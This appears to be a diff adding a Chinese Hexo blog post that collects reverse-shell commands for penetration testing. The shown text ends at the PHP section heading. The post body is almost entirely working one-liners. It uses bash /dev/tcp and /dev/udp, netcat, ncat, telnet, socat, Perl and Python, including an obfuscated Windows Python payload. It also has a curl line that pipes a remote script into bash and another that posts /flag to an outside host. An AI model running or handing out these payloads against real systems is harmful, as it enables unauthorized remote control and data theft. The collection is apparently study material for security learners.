@@ -1,0 +1,1364 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker-32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker-16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="学习笔记," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Ax-x" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="假设本机地址10.10.10.11，监听端口443。 Bash环境下反弹TCP协议shell首先在本地监听TCP协议443端口 1nc -lvp 443">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell合集">
+<meta property="og:url" content="https://ax-x.github.io/2022/05/13/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/index.html">
+<meta property="og:site_name" content="Ax-x">
+<meta property="og:description" content="假设本机地址10.10.10.11，监听端口443。 Bash环境下反弹TCP协议shell首先在本地监听TCP协议443端口 1nc -lvp 443">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-05-13T08:25:02.000Z">
+<meta property="article:modified_time" content="2022-05-13T08:27:37.067Z">
+<meta property="article:author" content="Ax-x">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ax-x.github.io/2022/05/13/反弹shell合集/"/>
+
+
+
+
+
+  <title>反弹shell合集 | Ax-x</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ax-x</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">以有限的时间，做无限的事情</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ax-x.github.io/2022/05/13/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head_portrait.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ax-x">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">反弹shell合集</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-05-13T16:25:02+08:00">
+                2022-05-13
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2022-05-13T16:27:37+08:00">
+                2022-05-13
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  20
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>假设本机地址10.10.10.11，监听端口443。</p>
+<h2 id="Bash环境下反弹TCP协议shell"><a href="#Bash环境下反弹TCP协议shell" class="headerlink" title="Bash环境下反弹TCP协议shell"></a>Bash环境下反弹TCP协议shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">/bin/</span>bash -i &gt; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">0</span>&lt;&amp; <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">exec <span class="number">5</span>&lt;&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; done</span><br><span class="line"></span><br><span class="line">exec <span class="regexp">/bin/</span>sh <span class="number">0</span>&lt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">1</span>&gt;&amp;<span class="number">0</span> <span class="number">2</span>&gt;&amp;<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>&lt;&amp;<span class="number">196</span>;exec <span class="number">196</span>&lt;&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span>; sh &lt;&amp;<span class="number">196</span> &gt;&amp;<span class="number">196</span> <span class="number">2</span>&gt;&amp;<span class="number">196</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Bash环境下反弹UDP协议shell"><a href="#Bash环境下反弹UDP协议shell" class="headerlink" title="Bash环境下反弹UDP协议shell:"></a>Bash环境下反弹UDP协议shell:</h2><p>首先在本地监听UDP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -u -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sh</span> -i &gt;&amp; /dev/udp/<span class="number">10.10.10.11</span>/<span class="number">443</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用Netcat反弹shell"><a href="#使用Netcat反弹shell" class="headerlink" title="使用Netcat反弹shell"></a>使用Netcat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/sh <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -c bash <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">mknod</span> backpipe p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>&lt;backpipe | /bin/bash <span class="number">1</span>&gt;backpipe </span><br><span class="line"><span class="attribute">rm</span> /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.10.10.11</span> <span class="number">443</span> &gt;/tmp/f</span><br><span class="line"><span class="attribute">rm</span> -f /tmp/p; mknod /tmp/p p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>/tmp/p <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="attribute">rm</span> f;mkfifo f;cat f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.10.10.11</span> <span class="number">443</span> &gt; f</span><br><span class="line"><span class="attribute">rm</span> -f x; mknod x p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>&lt;x | /bin/bash <span class="number">1</span>&gt;x</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用Ncat反弹shell"><a href="#使用Ncat反弹shell" class="headerlink" title="使用Ncat反弹shell"></a>使用Ncat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ncat</span> <span class="number">10.10.10.11</span> <span class="number">443</span> -e /bin/bash</span><br><span class="line"><span class="attribute">ncat</span> --udp <span class="number">10.10.10.11</span> <span class="number">443</span> -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用curl反弹shell"><a href="#利用curl反弹shell" class="headerlink" title="利用curl反弹shell"></a>利用curl反弹shell</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.20.151/</span><span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">curl http:<span class="regexp">//</span><span class="number">174.1</span>.<span class="number">73.154</span>/shell.txt|bash</span><br></pre></td></tr></table></figure>
+
+<p>PS：OOB的时候可以</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> <span class="number">174.2.171.201:6666</span> -d @/flag</span><br></pre></td></tr></table></figure>
+
+<p>加<code>@</code>表示文件</p>
+<h2 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rm</span> -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>/tmp/p <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="attribute">telnet</span> <span class="number">10.10.10.11</span> <span class="number">443</span> | /bin/bash | telnet <span class="number">10.10.10.11</span> <span class="number">444</span></span><br><span class="line"><span class="attribute">rm</span> f;mkfifo f;cat f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|telnet <span class="number">10.10.10.11</span> <span class="number">443</span> &gt; f</span><br><span class="line"><span class="attribute">rm</span> -f x; mknod x p &amp;&amp; telnet <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>&lt;x | /bin/bash <span class="number">1</span>&gt;x</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用Socat反弹shell"><a href="#使用Socat反弹shell" class="headerlink" title="使用Socat反弹shell"></a>使用Socat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> file:`tty`,raw,echo=<span class="number">0</span> TCP-L:<span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span></span><br><span class="line">socat tcp-connect:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span> exec:<span class="string">&quot;bash -li&quot;</span>,pty,stderr,setsid,sigint,sane</span><br><span class="line">wget -q https:<span class="regexp">//gi</span>thub.com<span class="regexp">/andrew-d/</span>static-binaries<span class="regexp">/raw/m</span>aster<span class="regexp">/binaries/</span>linux<span class="regexp">/x86_64/</span>socat -O <span class="regexp">/tmp/</span>socat; chmod +x <span class="regexp">/tmp/</span>socat; <span class="regexp">/tmp/</span>socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用Perl脚本反弹"><a href="#利用Perl脚本反弹" class="headerlink" title="利用Perl脚本反弹"></a>利用Perl脚本反弹</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;10.10.10.11&quot;</span>;<span class="variable">$p</span>=<span class="number">443</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line">perl -MIO -e &#x27;<span class="variable">$p</span>=fork;<span class="keyword">exit</span>,<span class="keyword">if</span>(<span class="variable">$p</span>);<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">&quot;10.10.10.11:443&quot;</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> <span class="keyword">while</span>&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>win平台下执行：</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#x27;<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">&quot;10.10.10.11:443&quot;</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> while<span class="variable">&lt;&gt;</span>;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用Python脚本反弹shell"><a href="#利用Python脚本反弹shell" class="headerlink" title="利用Python脚本反弹shell"></a>利用Python脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<p>IPv4协议如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"><span class="attribute">export</span> RHOST=<span class="string">&quot;10.10.10.11&quot;</span>;export RPORT=<span class="number">443</span>;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(<span class="string">&quot;RHOST&quot;</span>),int(os.getenv(<span class="string">&quot;RPORT&quot;</span>))));[os.dup<span class="number">2</span>(s.fileno(),fd) for fd in (<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)&#x27;</span><br><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>);os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>IPv6协议如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET<span class="number">6</span>,socket.SOCK_STREAM);s.connect((<span class="string">&quot;dead:beef:2::125c&quot;</span>,<span class="number">443</span>,<span class="number">0</span>,<span class="number">2</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Windows平台如下:</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\python.exe -c <span class="string">&quot;(lambda __y, __g, __contextlib: <span class="subst">[[[[[[[(s.connect((&#x27;10.10.10.11&#x27;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0]</span>(lambda: None)]<span class="subst">[2]</span>)(__contextlib.nested(type(&#x27;except&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and <span class="subst">[True for __out[0]</span> in <span class="subst">[((s.close(), lambda after: after())[1]</span>)]]<span class="subst">[0]</span>)&#125;)(), type(&#x27;try&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: <span class="subst">[False for __out[0]</span> in <span class="subst">[((p.wait(), (lambda __after: __after()))[1]</span>)]]<span class="subst">[0]</span>&#125;)())))(<span class="subst">[None]</span>))<span class="subst">[1]</span> for p2s_thread.daemon in <span class="subst">[(True)]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p2s_thread&#x27;]</span> in <span class="subst">[(threading.Thread(target=p2s, args=[s, p]</span>))]]<span class="subst">[0]</span>)<span class="subst">[1]</span> for s2p_thread.daemon in <span class="subst">[(True)]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;s2p_thread&#x27;]</span> in <span class="subst">[(threading.Thread(target=s2p, args=[s, p]</span>))]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(subprocess.Popen([&#x27;\\windows\\system32\\cmd.exe&#x27;]</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]]<span class="subst">[0]</span>)<span class="subst">[1]</span> for __g<span class="subst">[&#x27;s&#x27;]</span> in <span class="subst">[(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p2s&#x27;]</span>, p2s.__name__ in <span class="subst">[(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#x27;s&#x27;]</span>.send(__l<span class="subst">[&#x27;p&#x27;]</span>.stdout.read(1)), __this())<span class="subst">[1]</span> if True else __after())())(lambda: None) for __l<span class="subst">[&#x27;s&#x27;]</span>, __l<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(s, p)]</span>]<span class="subst">[0]</span>)(&#123;&#125;), &#x27;p2s&#x27;)]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;s2p&#x27;]</span>, s2p.__name__ in <span class="subst">[(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#x27;p&#x27;]</span>.stdin.write(__l<span class="subst">[&#x27;data&#x27;]</span>), __after())<span class="subst">[1]</span> if (len(__l<span class="subst">[&#x27;data&#x27;]</span>) &gt; 0) else __after())(lambda: __this()) for __l<span class="subst">[&#x27;data&#x27;]</span> in <span class="subst">[(__l[&#x27;s&#x27;]</span>.recv(1024))]]<span class="subst">[0]</span> if True else __after())())(lambda: None) for __l<span class="subst">[&#x27;s&#x27;]</span>, __l<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(s, p)]</span>]<span class="subst">[0]</span>)(&#123;&#125;), &#x27;s2p&#x27;)]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;os&#x27;]</span> in <span class="subst">[(__import__(&#x27;os&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;socket&#x27;]</span> in <span class="subst">[(__import__(&#x27;socket&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;subprocess&#x27;]</span> in <span class="subst">[(__import__(&#x27;subprocess&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;threading&#x27;]</span> in <span class="subst">[(__import__(&#x27;threading&#x27;, __g, __g))]</span>]<span class="subst">[0]</span>)((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#x27;contextlib&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用PHP脚本反弹shell"><a href="#利用PHP脚本反弹shell" class="headerlink" title="利用PHP脚本反弹shell"></a>利用PHP脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
